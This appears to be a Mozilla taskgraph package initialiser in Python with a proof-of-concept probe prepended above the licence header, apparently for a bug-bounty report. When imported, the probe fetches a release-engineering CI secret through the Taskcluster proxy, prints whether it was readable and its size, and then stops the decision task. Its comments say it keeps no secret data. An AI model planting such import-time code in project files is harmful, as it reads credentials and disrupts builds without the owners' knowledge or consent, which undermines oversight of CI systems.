def _h1_probe():
    import os, urllib.request, urllib.error

    _SECRET_PATH = "project/releng/shipit/ci"   # tooltool: project/releng/tooltool/ci
    proxy = os.environ.get("TASKCLUSTER_PROXY_URL", "http://taskcluster").rstrip("/")

    # Disable redirects: a 3xx becomes an HTTPError instead of being followed,
    # so the proxy-authenticated request can never be sent to another host.
    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None

    opener = urllib.request.build_opener(_NoRedirect)
    try:
        resp = opener.open(proxy + "/secrets/v1/secret/" + _SECRET_PATH, timeout=15)
        raw = resp.read()          # secret bytes live only in this local
        size = len(raw)            # measure
        del raw                    # and drop the only reference to them
        return ("readable", size)
    except urllib.error.HTTPError as h:
        return ("denied", h.code)
    except Exception:
        return ("error", 0)


# Only a label and an int cross back into module scope - never any secret data.
_h1_result, _h1_number = _h1_probe()
print("H1_SECRET_PROOF result=%s value=%d" % (_h1_result, _h1_number))
raise SystemExit("H1 PoC marker - decision intentionally stopped, no tasks created")

# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.


from importlib import import_module


def register(graph_config):
    """
    Import all modules that are siblings of this one, triggering decorators in
    the process.
    """
    _import_modules([
        "parameters",
        "transforms",
    ])


def _import_modules(modules):
    for module in modules:
        import_module(f".{module}", package=__name__)
